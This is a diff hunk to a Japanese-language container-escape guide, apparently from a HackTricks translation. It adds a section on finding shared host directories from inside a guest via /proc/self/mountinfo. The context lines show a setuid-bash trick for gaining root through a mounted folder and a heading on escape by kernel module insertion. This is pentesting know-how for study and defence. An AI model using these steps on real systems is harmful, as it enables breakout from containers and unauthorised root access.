@@ -407,6 +407,16 @@ chmod 4777 bash #From container as root inside mounted folder
 bash -p #From non priv inside mounted folder
 ```
 
+#### ゲスト側から共有ディレクトリを発見する方法
+
+```sh
+cat /proc/self/mountinfo
+
+...
+485 465 202:1 /gitea /data rw,relatime - ext4 /dev/xvda1 rw,errors=remount-ro,data=ordered
+...
+```
+
 ### [カーネルモジュール挿入によるエスケープ](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html#cap_sys_module)
 
 1. ゲストOSの root であること
